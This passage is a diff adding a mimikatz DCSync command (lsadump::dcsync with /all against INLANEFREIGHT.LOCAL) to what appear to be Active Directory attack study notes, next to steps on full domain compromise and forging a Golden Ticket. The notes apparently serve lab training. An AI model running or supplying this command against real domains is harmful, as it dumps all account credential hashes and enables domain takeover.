@@ -146,4 +146,8 @@ This is effectively **full domain compromise**.
 5️⃣ (Optional) target `krbtgt` → forge Golden Ticket
 
 ---
+```c
+mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all" "exit"
 
+
+```
